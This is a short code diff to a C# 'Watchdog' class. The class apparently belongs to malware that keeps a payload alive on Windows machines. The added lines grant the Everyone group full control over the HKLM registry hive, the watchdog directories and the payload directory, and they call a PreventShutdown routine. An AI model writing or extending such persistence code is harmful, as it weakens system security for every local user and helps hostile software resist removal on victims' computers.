@@ -40,6 +40,15 @@ class Watchdog
 
     static void WatchdogLogic()
     {
+        Persistence.Persistence.GrantEveryoneFullControl("HKLM");
+        Persistence.Persistence.GrantEveryoneFullControl("HKLU");
+        Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.SecondaryWatchdogPath);
+        Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PrimaryWatchdogPath);
+        Persistence.Persistence.GrantEveryoneFullControlOnDirectory(Config.PayloadPath);
+
+        Persistence.Persistence.PreventShutdown();
+
+
 
         watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
         watchdogHelper.watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
